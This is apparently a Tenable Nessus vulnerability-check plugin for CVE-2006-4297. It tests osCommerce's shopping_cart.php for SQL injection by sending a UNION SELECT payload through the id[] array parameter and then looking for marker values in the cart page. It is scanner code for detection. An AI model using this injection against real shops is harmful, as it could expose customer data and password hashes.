#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22255);
  script_version("$Revision: 1.23 $");
 script_cvs_date("$Date: 2017/04/25 14:31:38 $");

  script_cve_id("CVE-2006-4297");
  script_bugtraq_id(19644, 19774);
  script_osvdb_id(29508);

  script_name(english:"osCommerce shopping_cart.php id Array Parameters SQL Injection");
  script_summary(english:"Checks for SQL injection flaw in osCommerce");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
SQL injection attack." );
  script_set_attribute(attribute:"description", value:
"The version of osCommerce installed on the remote host fails to
properly sanitize input used for product attributes before using it in
a database query in the 'shopping_cart.php' script.  Provided PHP's
'magic_quotes_gpc' setting is disabled, an unauthenticated attacker
may be able to exploit this issue to uncover sensitive information
such as password hashes, modify data, launch attacks against the
underlying database, etc." );
  script_set_attribute(attribute:"see_also", value:"http://www.gulftech.org/?node=research&article_id=00110-08172006");
  script_set_attribute(attribute:"see_also", value:"https://exchange.xforce.ibmcloud.com/vulnerabilities/28434");
  script_set_attribute(attribute:"solution", value:"Upgrade to osCommerce 2.2 Milestone 2 Update 060817 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2006/08/17");
 script_set_attribute(attribute:"plugin_publication_date", value:"2006/08/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2017 Tenable Network Security, Inc.");

  script_dependencies("oscommerce_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/oscommerce");
  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");


port = get_http_port(default:80, php: 1);

# Test an install.
install = get_install_from_kb(appname:'oscommerce', port:port);
if (isnull(install)) exit(0, "osCommerce wasn't detected on port "+port+".");
dir = install['dir'];


# Grab the main page.
res = http_get_cache(item:string(dir, "/index.php"), port:port, exit_on_fail: 1);

# Identify a product.
pat = '/product_info\\.php\\?products_id=([^&"]+)';
matches = egrep(pattern:pat, string:res);
id = NULL;

if (matches)
{
  foreach match (split(matches, keep:FALSE))
  {
    id = eregmatch(pattern:pat, string:match);
    if (!isnull(id))
    {
      id = id[1];
      break;
    }
  }
}
if (isnull(id)) exit(1, "Failed to identify a product in the osCommerce install at "+build_url(port:port, qs:dir+"/")+".");


# Inject our exploit into a saved session.
#
# nb: magic1 must appear before any of the other values of
#     products_options_names after the ORDER BY or the exploit may fail.
magic1 = string("    ", SCRIPT_NAME);
magic2 = string(unixtime());
exploit = string("1' UNION SELECT '", magic1, "',", magic2, ",null,null ORDER BY products_options_name LIMIT 1-- ");
sid = hexstr(MD5(magic2));
postdata = string(
  "id[", id, "][1]=", urlencode(str:exploit), "&",
  "cart_quantity[]=1&",
  "products_id[]=", id, "&",
  "osCsid=", sid
);
w = http_send_recv3(method:"POST", port: port,
  item: dir+"/product_info.php?action=update_product",
  content_type: "application/x-www-form-urlencoded",
  exit_on_fail: 1, data: postdata);
res = strcat(w[0], w[1], '\r\n', w[2]);

# Now try to exploit the flaw.
w = http_send_recv3(method:"GET",
  item:string(
    dir, "/shopping_cart.php?",
    "osCsid=", sid
  ),
  exit_on_fail: 1, port:port
);
res = w[2];

# There's a problem if we see our magic values where the attributes should be.
if (string("<br><small><i> - ", magic1, " ", magic2, "</i></small>") >< res)
{
  security_hole(port);
  set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
  exit(0);
}
else
  exit(0, "No oscommerce installation is vulnerable on port "+port);
